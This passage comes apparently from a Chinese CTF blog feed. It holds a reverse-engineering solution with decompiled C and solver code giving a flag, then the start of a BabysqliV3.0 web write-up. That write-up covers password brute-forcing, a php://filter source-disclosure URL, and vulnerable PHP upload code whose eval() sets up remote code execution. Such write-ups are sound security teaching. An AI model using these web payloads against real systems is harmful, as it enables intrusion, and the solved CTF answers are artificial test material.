keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token string">'d'</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token operator">!=</span> <span class="token string">'D'</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">Decry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token string">'q'</span> <span class="token operator">||</span> v4 <span class="token operator">==</span> <span class="token string">'Q'</span> <span class="token punctuation">)</span>      <span class="token function">Exit</span><span class="token punctuation">(</span><span class="token string">"Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: "</span><span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input fault format!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v3 <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到输入d或D开始之后进入了<code>Decry()</code>，然后进入该方法查看它的c代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">Decry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> flag1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Fh] [rbp-51h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-50h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-4Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-48h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-44h]</span>  <span class="token keyword">char</span> src<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-40h] BYREF</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-38h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-30h]</span>  __int64 v9<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-20h] BYREF</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-8h]</span>  v11 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>src <span class="token operator">=</span> <span class="token string">'SLCDN'</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v9<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'wodah'</span><span class="token punctuation">;</span>  v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>  v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  text <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span>key3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> key1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcat</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>      key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>    <span class="token operator">++</span>v3<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    flag1 <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> flag1 <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> flag1 <span class="token operator">==</span> <span class="token string">' '</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">++</span>v2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> flag1 <span class="token operator">&lt;=</span> <span class="token string">'`'</span> <span class="token operator">||</span> flag1 <span class="token operator">></span> <span class="token string">'z'</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> flag1 <span class="token operator">></span> <span class="token string">'@'</span> <span class="token operator">&amp;&amp;</span> flag1 <span class="token operator">&lt;=</span> <span class="token string">'Z'</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          str2<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>flag1 <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v3<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        str2<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>flag1 <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>        <span class="token operator">++</span>v3<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>v3 <span class="token operator">%</span> v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">++</span>v2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> str2<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulation!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v11<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而key3和key1的赋值如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000202030</span> key3            db <span class="token string">'kills'</span><span class="token punctuation">,</span><span class="token number">0</span>            <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> Decry<span class="token operator">+</span><span class="token number">5</span>A↑o    <span class="token punctuation">.</span>data<span class="token operator">:</span><span class="token number">0000000000202010</span> key1            db <span class="token string">'ADSFK'</span><span class="token punctuation">,</span><span class="token number">0</span>            <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> Decry<span class="token operator">+</span><span class="token number">6</span>D↑o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>emmm，然后就是这的<code>wodah</code>和<code>SLCDN</code>要反过来写，似乎涉及到了底层的大端与小端存储</p><p>所以<code>text = killshadow</code>，<code>key=ADSFKNDCLS</code>重要参数都有了，接下来进入主要的解密方法，对了key进行了下面的变换，我们进行简单的正向推</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;cstring&gt;using namespace std;int main()&#123;    string key &#x3D; &quot;ADSFKNDCLS&quot;;    int v3 &#x3D; 0;    int v5 &#x3D; 10;    for (int i &#x3D; 0; i &lt; v5; ++i )    &#123;        if ( key[v3 % v5] &gt; &#39;@&#39; &amp;&amp; key[v3 % v5] &lt;&#x3D; &#39;Z&#39; )            key[i] &#x3D; key[v3 % v5] + &#39; &#39;;        ++v3;    &#125;    cout &lt;&lt; key &lt;&lt; endl;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将上面的c++代码执行之后得key<code>adsfkndcls</code>，啥玩意？就转了个大小写？好吧。。。</p><p>然后进入最主要的地方，c++代码为（本来想用python，但是还是锻炼一下c++能力吧），上面的主要的变换逻辑就是字母就进行变换，变换之后的长度还为10，毕竟只是变换</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;cstring&gt;using namespace std;int main()&#123;    string key &#x3D; &quot;adsfkndcls&quot;;    string text &#x3D; &quot;killshadow&quot;;    int i;    int v3 &#x3D; 10;    for (int i &#x3D; 0; i &lt; 10; i++)    &#123;        for (int j &#x3D; 32; j &lt; 128; j++)        &#123;            if ((j &gt;&#x3D; &#39;a&#39; &amp;&amp; j &lt;&#x3D; &#39;z&#39;) || (j &gt;&#x3D; &#39;A&#39; &amp;&amp; j &lt;&#x3D; &#39;Z&#39;))            &#123;                if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 &#x3D;&#x3D; text[i])                &#123;                    char temp &#x3D; toascii(j);                    cout &lt;&lt; temp;                    v3++;                    break;                &#125;            &#125;        &#125;    &#125;&#125;&#x2F;&#x2F;KLDQCUDFZO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后是python代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> stringkey <span class="token operator">=</span> <span class="token string">"adsfkndcls"</span>text <span class="token operator">=</span> <span class="token string">"killshadow"</span>v3 <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> flag <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">39</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>v3 <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">==</span> text<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            v3 <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">break</span><span class="token comment"># KLDQCUDFZO</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><code>flag&#123;KLDQCUDFZO&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> elf文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019_BabysqliV3.0</title>
      <link href="2021/04/04/GXYCTF2019-BabysqliV3-0/"/>
      <url>2021/04/04/GXYCTF2019-BabysqliV3-0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="bp爆破密码"><a href="#bp爆破密码" class="headerlink" title="bp爆破密码"></a>bp爆破密码</h2><p>先进行密码爆破，用户名为admin，直接使用sniper模式爆破密码即可</p><p><img src="/2021/04/04/GXYCTF2019-BabysqliV3-0/image-20210404132755704.png" alt="爆破得密码"></p><p>用户名-密码<code>admin-password</code></p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>登陆是一个有上传图片功能的主页，php伪协议读取upload.php页面源码<code>http://8293a1c6-d13f-4f9a-a546-28ff2d13a03a.node3.buuoj.cn/home.php?file=php://filter/read=convert.base64-encode/resource=upload</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>上传<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Uploader</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/uploads/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token double-quoted-string string">".txt"</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"echo '&lt;br>&lt;br>Master, I want to study rizhan!&lt;br>&lt;br>';"</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span><span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"[^a-z0-9]"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"die('illegal filename!');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"die('you are too big (′▽`〃)');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"move_uploaded_file('"</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"', '"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span><span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token comment">// return $sandbox.$this->Filename.$ext;</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"die('check token falied!');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$uploader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uploader</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"下面是你上传的文件：&lt;br>"</span><span class="token punctuation">.</span><span class="token variable">$uploader</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>rce利用代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"die('check token falied!');"</span><span class="token punctuation">;</span><span class="token 